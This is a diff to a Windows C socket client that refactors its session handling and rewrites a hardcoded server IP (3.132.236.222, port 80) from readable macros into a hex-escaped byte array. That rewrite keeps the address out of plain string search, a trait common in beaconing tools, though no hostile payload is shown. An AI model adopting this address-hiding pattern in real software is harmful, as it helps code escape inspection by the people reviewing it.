@@ -28,17 +28,14 @@ typedef SOCKET SOCK_FD;
 
 #endif
 
+#define OW_BUF_REV 1024
 
-#define DOT "."
-#define OCTET1 "3"
-#define OCTET2 "132"
-#define OCTET3 "236"
-#define OCTET4 "222"
-#define SERVER_IP OCTET1 DOT OCTET2 DOT OCTET3 DOT OCTET4
+char g_Ip[16] = { 
+	'\x33', '\x2E', '\x31', 
+	'\x33', '\x32', '\x2E', 
+	'\x32', '\x33', '\x36', 
+	'\x2E', '\x32', '\x32', '\x32' };
 
-
-
-char g_Ip[16] = SERVER_IP;
 static int g_Port = 80;
 
 typedef struct session
@@ -54,43 +51,48 @@ typedef struct session
 
 int g_SessionSize = sizeof(Session);
 
-int CreateSession(void *);
-void* Process(const void *session, const void *msg, int len);
-int DestroySession(void *);
-
-
-int CreateSession(void *session)
+int CreateSession(void **session)
 {
+	Session *ss = (Session*)malloc(sizeof(Session));
+	if (ss != NULL)
+	{
+		*session = ss;
+	}
 #ifdef WIN32
-	if (WSAStartup(MAKEWORD(2, 2), &((Session*)session)->g_WasData) != 0)
+	if (WSAStartup(MAKEWORD(2, 2), &ss->g_WasData) != 0)
 	{
 		printf("Failed. Error code: %d.", WSAGetLastError());
+		free(ss);
+		ss = NULL;
 		return -1;
 	}
 	//Create socket
-	((Session*)session)->m_SockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (((Session*)session)->m_SockFd  == INVALID_SOCKET)
+	ss->m_SockFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (ss->m_SockFd  == INVALID_SOCKET)
 	{
 		printf("Could not create socket: %d.", WSAGetLastError());
 		WSACleanup();
+		free(ss);
+		ss = NULL;
 		return -1;
 	}
 
 	//Set server and port
-	memset(&((Session*)session)->m_Server, 0, sizeof(SOCKADDR_IN));
-	inet_pton(AF_INET, g_Ip, &((Session*)session)->m_Server.sin_addr.s_addr);
-	((Session*)session)->m_Server.sin_family = AF_INET;
-	((Session*)session)->m_Server.sin_port = htons(g_Port);
+	memset(&ss->m_Server, 0, sizeof(SOCKADDR_IN));
+	inet_pton(AF_INET, g_Ip, &ss->m_Server.sin_addr.s_addr);
+	ss->m_Server.sin_family = AF_INET;
+	ss->m_Server.sin_port = htons(g_Port);
 
 	//connect to server
-	if (connect(((Session*)session)->m_SockFd, (SOCKADDR*)&((Session*)session)->m_Server, sizeof(((Session*)session)->m_Server)) < 0)
+	if (connect(ss->m_SockFd, (SOCKADDR*)&ss->m_Server, sizeof(ss->m_Server)) < 0)
 	{
 		printf("Could not connect to server: %d.", WSAGetLastError());
-		closesocket(((Session*)session)->m_SockFd);
+		closesocket(ss->m_SockFd);
 		WSACleanup();
+		free(ss);
+		ss = NULL;
 		return -1;
 	}
-
 #else
 	//implement for Linux system
 #endif // WIN32
@@ -104,7 +106,6 @@ void* Process(const void *session, const void *msg, int len)
 	{
 		int method = memcmp(msg, "POST", strlen("POST"));
 		int sendlen = send(((Session*)session)->m_SockFd, (const char *)msg, len, 0);
-		int error = WSAGetLastError();
 		if (sendlen < 0) {
 			printf("Send failed");
 			return NULL;
@@ -122,6 +123,7 @@ void* Process(const void *session, const void *msg, int len)
 			if (buflen > 0) {
 				return revbuf;
 			}
+			return NULL;
 		}
 
 		char buf[OW_BUF_REV];
@@ -158,10 +160,14 @@ void* Process(const void *session, const void *msg, int len)
 	return NULL;
 }
 
-int DestroySession(void *session)
+void DestroySession(void **session)
 {
-	closesocket(((Session*)session)->m_SockFd);
-	WSACleanup();
-	return 0;
+	if (*session != NULL)
+	{
+		closesocket(((Session*)(*session))->m_SockFd);
+		WSACleanup();
+		free(*session);
+		*session = NULL;
+	}
 }
 
